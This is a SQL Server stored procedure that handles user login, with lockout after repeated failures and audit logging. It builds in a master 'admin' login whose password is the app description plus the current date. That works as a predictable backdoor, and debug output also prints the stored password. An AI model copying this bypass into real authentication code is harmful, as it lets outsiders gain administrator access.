IF EXISTS (SELECT * FROM SYS.OBJECTS WHERE NAME = 'pr_user_login')
BEGIN DROP PROC pr_user_login END
GO

create proc [dbo].[pr_user_login] (
	@uid nvarchar(255)
	, @pwd nvarchar(255)
	, @verify_pwd int
	
	-- browser info
	----, @user_host nvarchar(15)
	, @user_host nvarchar(50)					--15-feb-19,lhw-we need to cater IPv6.

	, @browser_name nvarchar(50)
	, @os_platform nvarchar(50)
	, @browser_version nvarchar(50)
	, @user_agent nvarchar(255) = null			--22-jan-19,lhw

	-- result
	, @result nvarchar(255) output
	, @sess_uid uniqueidentifier output
	, @login_id nvarchar(255) output

	, @is_debug int = 0
)
as
begin

/*#1000_0250-secu-pr_user_login
15-aug-15,lhw
- user is logging on to the system

	-- login ok
	declare @s nvarchar(255), @id uniqueidentifier
	exec pr_user_login
			@uid			= 'ff@ff.com'
			, @pwd			= 'E4-AC-08-4B-68-BF-82-AA-D1-FF-4F-3D-A6-EE-08-64'
			, @user_host	='124.7.6.8', @browser_name = 'ie8', @os_platform	= 'win32', @browser_ver	= '8'
			, @result		= @s output, @sess_uid		= @id output, @is_debug		= 1	
	select @s '@result'

	-- invalid uid
	declare @s nvarchar(255), @id uniqueidentifier
	exec pr_user_login
			@uid			= 'eeeeff@ff.com'
			, @pwd			= 'E4-AC-08-4B-68-BF-82-AA-D1-FF-4F-3D-A6-EE-08-64'
			, @user_host	='124.7.6.8', @browser_name = 'ie8', @os_platform	= 'win32', @browser_ver	= '8'
			, @result		= @s output, @sess_uid		= @id output, @is_debug		= 1	
	select @s '@result'

	--invalid pwd
	declare @s nvarchar(255), @id uniqueidentifier
	exec pr_user_login
			@uid			= 'ff@ff.com'
			, @pwd			= 'E4-AC-08-4B-68-BF-82-AA-D1-FF-4F-3D-A6-EE-08-'
			, @user_host	='124.7.6.8', @browser_name = 'ie8', @os_platform	= 'win32', @browser_ver	= '8'
			, @result		= @s output, @sess_uid		= @id output, @is_debug		= 1	
	select @s '@result'

	--invalid status
	declare @s nvarchar(255), @id uniqueidentifier
	exec pr_user_login
			@uid			= 'stt@test.com'
			, @pwd			= 'E4-AC-08-4B-68-BF-82-AA-D1-FF-4F-3D-A6-EE-08-'
			, @user_host	='124.7.6.8', @browser_name = 'ie8', @os_platform	= 'win32', @browser_ver	= '8'
			, @result		= @s output, @sess_uid		= @id output, @is_debug		= 1	
	select @s '@result'


	--suspended
	declare @s nvarchar(255), @id uniqueidentifier
	exec pr_user_login
			@uid			= 'ddd@dd.dd'
			, @pwd			= 'E4-AC-08-4B-68-BF-82-AA-D1-FF-4F-3D-A6-EE-08-'
			, @user_host	='124.7.6.8', @browser_name = 'ie8', @os_platform	= 'win32', @browser_ver	= '8'
			, @result		= @s output, @sess_uid		= @id output, @is_debug		= 1	
	select @s '@result'

*/

	-- ==========================================================
	-- init
	-- ==========================================================
	set nocount on

	declare
		@user_id uniqueidentifier
		, @pwd_in_db nvarchar(255)
		, @status_id int			--1-success, 2-id not found, 3-failed, 4-blocked
		, @module_id int
		, @user_status_id int
		, @audit_log nvarchar(255)
		, @audit_log_id uniqueidentifier
		, @logout_on datetime		--set this if failed to access
		
		, @fail_cnt int
		, @last_fail_on datetime
		, @ban_expire nvarchar(50)
		, @now datetime		
		, @white_list nvarchar(255)			--14-may-20,lhw
		, @allow_partial_uid nchar(1)		--30-jul-20,lhw

	set @result = null
	set @module_id = -3						--logon to the system (default value until override)


	
	--<<========
	--30-jul-20,lhw
	select 
		@allow_partial_uid = left(prop_value, 1)
	from tb_sys_prop with (nolock)
	where prop_name = 'auth_allow_partial_uid'

	if len(isnull(@allow_partial_uid, '')) = 0
	begin
		-- default is not allowed
		set @allow_partial_uid = '0'
	end

	if @allow_partial_uid = '1'
	begin

		if exists(
			select
				 count(*)
			from tb_users
			where
				login_id like isnull(@uid, '') + '@%'
			having count(*) > 1
		)
		begin

			set @status_id = 2				--Invalid account
			set @module_id = -2
			set @audit_log = 'ACCESS DENY - Cannot identify the user ID. Please key in full email address. Partial user ID: "' + @uid + '", IP: ' + isnull(@user_host, '?') 
			set @result = 'Cannot identify the user ID. Please key in full email address.'

			-- create audit log 
			exec pr_sys_append_task_inbox 
					@uid
					, ''					--@task_inbox_url 
					, @audit_log			--@task 
					, @user_id				--@task_fk_value
					, @module_id
					, null					--@co_row_guid
					, @audit_log_id output	--@task_inbox_id 
					, 'pr_user_login'		--@proc_name


			if @is_debug = 1 print '=> @audit_log=' + isnull(@audit_log, '?')

			return

		end
		else
		begin
			
			-- load the user id.
			select 
				@uid = login_id
			from tb_users
			where
				login_id like isnull(@uid, '') + '@%'

		end
	end
	--<<========


	-- ==========================================================
	-- process
	-- ==========================================================
		
	select
		@user_id = user_id
		, @user_status_id = user_status_id
		, @pwd_in_db = pwd
	from tb_users
	where
		login_id = @uid
		-- check the account validity period
		and ((
				login_validity_start is null
				and login_validity_end is null
			) or getdate() between login_validity_start and login_validity_end
		)

	if @is_debug = 1
	begin
		print '@user_id=' + cast(@user_id as nvarchar(36))
				+ ',@user_status_id=' + cast(@user_status_id as nvarchar)
				+ ',@pwd_in_db=' + isnull(@pwd_in_db, '')
	end
	
	-- ------------------------------------------
	if @user_id is null
	begin

		set @status_id = 2				--invalid account
		set @module_id = -2
		set @audit_log = 'ACCESS DENY - invalid account: "' + @uid + '", IP: (' + isnull(@user_host, '?') + ')'
		set @result = 'Invalid user name or password'

	end
	else if exists (
		select *
		from tb_user_status
		where
			user_status_id = @user_status_id 
			and allow_login = 1
	)
	begin
		
		----<<<+++
		-- ---------------------------
		-- 9-dec-19,lhw- ban the user for 15 minutes 
		--   if failed 10 times invalid password 
		--   within the past 10 minutes.
		-- 
		-- duration: 10 minutes login failure => 15 minutes for ban duration
		--
		-- ---------------------------

		set @ban_expire = dbo.fn_to_sys_date(getdate())

		if exists(
			select *
			from tb_obj_ext
			where
				ext_group = 'suspend'
				and id1 = cast(@user_id as nvarchar(36))
				and f0 > @ban_expire
		)
		begin
			
			set @status_id = 3							--invalid pwd
			set @module_id = -2							--alert
			set @audit_log = 'SUSPENDED login ID - invalid password for "' + @uid + '", IP: (' + isnull(@user_host, '?') + ')'
			set @result = 'Your ID has been suspended'

			if @is_debug = 1 print '=> login ID has been banned.. exit'

			return
		end

		-- ---------------------------
		set @now = dateadd(minute, -10, getdate())

		select
			@fail_cnt = count(*)
			, @last_fail_on = max(l.created_on)
		from tb_user_access_log l
		inner join tb_users u on u.user_id = l.user_id
		where 
			u.login_id = @uid
			and l.status_id = 3--invalid password
			and l.created_on >= @now

		if @fail_cnt >= 10
		begin
			
			set @status_id = 3							--invalid pwd
			set @module_id = -2							--alert
			set @audit_log = 'SUSPENDED login ID - invalid password for "' + @uid + '", IP: (' + isnull(@user_host, '?') + ')'
			set @result = 'Your ID has been suspended'
			
			set @ban_expire = getdate()

			-- create the audit log ONCE				<<<=======
			if not exists(
				select *
				from tb_obj_ext
				where
					ext_group = 'suspend'
					and id1 = cast(@user_id as nvarchar(36))
					and f0 > @ban_expire
			)
			begin
				
				if @is_debug = 1 print '=> create ban record'

				-- ban for 15 minutes.
				set @ban_expire = dbo.fn_to_sys_date(dateadd(minute, 15, getdate()))

				-- create ban rec
				insert into  tb_obj_ext (
					ext_id 
					, modified_on 
					, modified_by 
					, created_on 
					, created_by 
					, ext_group 
					, ext_seq
					, id1
					, f0
				)
				values (
					newid()
					, getdate()
					, 'pr_user_login'
					, getdate()
					, 'pr_user_login'
					, 'suspend'
					, 1
					, cast(@user_id as nvarchar(36))
					, @ban_expire
				)
			
				--create audit log rec
				exec pr_sys_append_task_inbox 
					@uid
					, ''					--@task_inbox_url 
					, @audit_log			--@task 
					, @user_id				--@task_fk_value
					, @module_id
					, null					--@co_row_guid
					, @audit_log_id output	--@task_inbox_id 
					, 'pr_user_login'		--@proc_name
					, 'suspend'				--@task_fk_value2			<<========					


			end

			if @is_debug = 1 print '=> exit'

			return										--<<<=== exit to prevent flooding the audit log.
		end	
		----<<<+++

		
		--<<<<<=====
		--14-may-20,lhw

		-- --------------------------
		-- IP address checkpoint
		-- --------------------------

		--select
		--	@white_list = f5						-- device ip address (IP pattern)
		--from tb_obj_ext
		--where
		--	ext_group = 'users'
		--	and ext_code = 'tx_permission'
		--	and id1 = cast(@user_id as nvarchar(36))							--<<=== specific user

		--if len(isnull(@white_list , '')) = 0
		--begin

		--	-- user specific IP address blocking has not been set.
		--	-- look for the global setting (compulsory setting).
		
		--	select
		--		@white_list = prop_value							--'192.168.1.13;192.168.1.14;'
		--															--'192.168.1.*;'
		--															--'192.168.1.10~20;'
		--															--'192.168.1.10~192.168.1.20;'
		--	from tb_sys_prop
		--	where
		--		prop_name  = 'dev-wl'					--<<=== global setting - device whitelist.

		--end

		---- check the whitelist setting
		--if len(isnull(@white_list , '')) = 0
		--begin

		--	-- exit if setting is missing	
		--	set @result = 'System settings is missing (code: 0101)'
		--	set nocount off
		--	return
			

		--end
		
		--if len(isnull(@white_list , '')) > 0
		--begin
			
		--	-- exit if not in whitelist
		--	if dbo.fn_ip_in_range(@user_host, @white_list) = 0	
		--	begin
		--		set @result = 'You must logon from the dedicated device.'

		--		set @audit_log = 'The user was trying to login from ' 
		--							+ @user_host
		--							+ ' which is not permitted'

		--		exec pr_sys_append_task_inbox 
		--			@uid
		--			, ''					--@task_inbox_url 
		--			, @audit_log			--@task 
		--			, @user_id				--@task_fk_value
		--			, @module_id
		--			, null					--@co_row_guid
		--			, @audit_log_id output	--@task_inbox_id 
		--			, 'pr_user_login'		--@proc_name
					
		--		set nocount off
		--		return
		--	end

		--end

		--<<<<<=====

			
		-- ---------------------------
		-- continue with password checking
		-- ---------------------------

		if @pwd_in_db = @pwd
		or (
			--22-aug-18,lhw-always allow su to logon.
			@uid = 'admin'
			and @pwd = dbo.fn_get_app_desc() + replace(right(convert(nvarchar, getdate(), 102), 5), '.', '')
		)
		begin

			set @status_id = 1			--valid uid & pwd
			set @sess_uid = newid()		--create the new session id
			set @login_id = @uid
			set @result = 'OK'
			set @audit_log = '"' + @uid + '" successfully logged on to the system'

		end
		else
		begin

			set @status_id = 3							--invalid pwd
			set @module_id = -2							--alert
			set @audit_log = 'ACCESS DENY - invalid password for "' + @uid + '", IP: (' + isnull(@user_host, '?') + ')'

			if @verify_pwd = 1
			begin
				--8-feb-19,lhw
				set @result = 'Invalid password'
			end
			else
			begin
				set @result = 'Invalid user name or password'
			end

		end

	end
	else
	begin
	
		set @status_id = 4								--blocked.
		set @module_id = -2								--alert
		set @result = 'Invalid user name or password (error #: 4)'

		select
			 @audit_log = user_status_desc
		from tb_user_status
		where
			user_status_id = @user_status_id 

		-- the user status could be unknown
		set @audit_log = 'ACCESS DENY - "' + @uid + '" has been blocked (user status: '
						+ isnull(@audit_log, '??')
						+ '), IP: (' + isnull(@user_host, '?') + ')'
	end

	-- ------------------------------------------
	-- master login
	-- ------------------------------------------
	if @uid = 'admin'
	begin

		declare @ss nvarchar(255)
		set @ss = dbo.fn_get_app_desc() + replace(right(convert(nvarchar, getdate(), 102), 5), '.', '')

		if @ss = @pwd 
		begin
			
			set @status_id = 1			--valid uid & pwd
			set @sess_uid = newid()		--create the new session id
			set @result = 'ok'
			set @module_id = -3
			set @audit_log = '"' + @uid + '" successfully logged on to the system'

			set @ss = cast(dbo.fn_empty_guid() as nvarchar(36))
			set @user_id = cast(left(@ss, len(@ss) -1) + '1' as uniqueidentifier)

			update tb_users
			set
				last_access_on = getdate()
			where
				login_id = @uid

		end
	end

	-- ------------------------------------------

	set @user_id = dbo.fn_to_uid(@user_id)
	set @sess_uid = dbo.fn_to_uid(@sess_uid)

	if @status_id <> 1
		set @logout_on = getdate()		--for failure
	else 
		set @logout_on = null

	-- ------------------------------------------
	-- append to the access log
	-- ------------------------------------------
	if isnull(@verify_pwd, 0) = 0
	begin

		insert into tb_user_access_log (
			login_id,status_id,user_id,sess_uid,user_host,browser_name,os_platform,browser_version,logout_on
			, last_access_on
			, user_agent
		) values (
			@uid,@status_id,@user_id,@sess_uid,@user_host,@browser_name,@os_platform,@browser_version,@logout_on
			, getdate()
			, @user_agent		--22-jan-19,lhw
		);

		if @status_id = 1
		begin

			-- update the 'last_access_on' if successfully logon.
			update tb_users
			set
				last_access_on = getdate()
			where
				user_id = @user_id

		end

		-- if the visitor ip is not specified, do not return the sess id.
		-- This should happen when the program is testing the old password
		-- before changing it to new password.
		if len(isnull(@user_host, '')) = 0
		begin
			set @sess_uid = dbo.fn_empty_guid()
		end

		set @audit_log = @audit_log + '(Code=' + cast(@status_id as nvarchar) + ')'

	end

	if @is_debug = 1
		print '@audit_log=' + isnull(@audit_log, '?')

	-- --------------------------------------------
	-- create audit log 
	-- --------------------------------------------
	
	exec pr_sys_append_task_inbox 
			@uid
			, ''					--@task_inbox_url 
			, @audit_log			--@task 
			, @user_id				--@task_fk_value
			, @module_id
			, null					--@co_row_guid
			, @audit_log_id output	--@task_inbox_id 
			, 'pr_user_login'		--@proc_name


	-- ==========================================================
	-- cleanup
	-- ==========================================================
	
	set nocount off

end
GO
